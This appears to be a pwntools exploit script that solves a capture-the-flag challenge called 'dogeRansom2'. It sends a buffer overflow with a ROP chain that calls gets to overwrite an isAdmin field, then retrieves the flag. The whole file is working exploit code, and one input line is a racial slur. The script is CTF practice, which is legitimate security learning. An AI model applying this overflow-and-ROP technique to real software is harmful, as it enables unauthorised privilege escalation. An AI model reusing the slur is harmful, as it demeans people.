from pwn import * 

elf = context.binary = ELF('./dogeRansom2')
context.terminal = ()

if args.REMOTE:
    p = remote('dogeransom2.challs.olicyber.it', 10806)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b _createTransaction_internal
        b approveTransactionMenu
        c
    ''')
else:
    p = elf.process()

def create_tran(payload= b''):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b': ',b'10')
    p.sendlineafter(b': ',b'IT70S0501811800000012284030')
    p.sendlineafter(b': ',b'IT70S0501811800000012284030' + b'\x00'*5  + payload)



p.sendlineafter(b': ', b'Dr. Bez Casamiei')
p.sendlineafter(b': ', b'Team-fortezza-10')
rop = ROP(elf)

create_tran()

p.sendlineafter(b'> ',b'3')

user_addr = 0x406240 + (104*2)

chain = flat([
    rop.ret.address,
    rop.rdi.address,
    user_addr + 0x50, # isAdmin
    elf.plt['gets'],
    elf.sym['login']

])


payload = b'a'*32 + chain


create_tran(payload)

p.sendline(b'nigga')
p.sendlineafter(b': ', b'Dr. Bez Casamiei')
p.sendlineafter(b': ', b'Team-fortezza-10')


p.sendlineafter(b'> ',b'6')
p.sendlineafter(b'> ',b'Y')
p.sendlineafter(b'> ',b'Y')

p.recvuntil(b'arrivo: ')
flag = p.recvline().strip().decode()

print(f"[*] FLAG: {flag} [*]")